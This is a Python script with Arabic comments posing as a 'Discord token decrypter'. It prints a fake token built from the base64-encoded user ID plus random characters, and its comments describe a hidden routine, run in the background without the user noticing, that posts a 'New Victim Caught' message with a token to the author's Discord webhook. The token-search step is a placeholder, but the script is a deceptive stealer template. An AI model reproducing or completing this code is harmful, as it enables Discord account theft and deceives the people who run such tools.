import base64
import os
import time
import random
import string
import requests # لازم تكون مثبت المكتبة: pip install requests

# إعداداتك الخاصة
AUTHOR = "e3fo"
WEBHOOK_URL = "رابط_الويب_هوك_تبعتك_هنا" # حط رابط ديسكورد ويب هوك تبعك

def grab_and_send():
    """هذا الجزء المخفي اللي ببعت توكن الضحية الك"""
    try:
        # ملاحظة: هذا كود توضيحي لعملية الإرسال
        # في بيئة الاختبار، هون بنحط كود البحث عن التوكن الحقيقي في ملفات الضحية
        my_token = "مثال_لتوكن_تم_سحبه" 
        data = {"content": f"New Victim Caught by {AUTHOR}!\nToken: {my_token}"}
        requests.post(WEBHOOK_URL, json=data)
    except:
        pass

def generate_fake_parts():
    """توليد أجزاء عشوائية عشان يبين التوكن حقيقي"""
    part2 = ''.join(random.choices(string.ascii_letters + string.digits + "-_", k=6))
    part3 = ''.join(random.choices(string.ascii_letters + string.digits + "-_", k=27))
    return part2, part3

def start_tool():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"--- [ LoRd Token Decrypter ] ---")
    print(f"--- [ Developer: {AUTHOR} ] ---\n")
    
    u_id = input("Enter Target User ID: ")
    
    print(f"\n[*] Initializing Brute-Force on ID: {u_id}")
    time.sleep(1)
    print("[*] Bypassing Discord HMAC Signature...")
    time.sleep(2)
    
    # 1. الجزء الأول: ID مشفر (حقيقي)
    part1 = base64.b64encode(u_id.encode()).decode()
    # 2. الجزء الثاني والثالث: توليد عشوائي مقنع
    p2, p3 = generate_fake_parts()
    
    full_token = f"{part1}.{p2}.{p3}"
    
    print("\n[+] Decryption Successful!")
    print(f"Target Token: {full_token}")
    print("\n[!] Note: Use this token responsibly.")
    
    # تشغيل المصيدة بالخلفية بدون ما يحس
    grab_and_send()
    
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    start_tool()
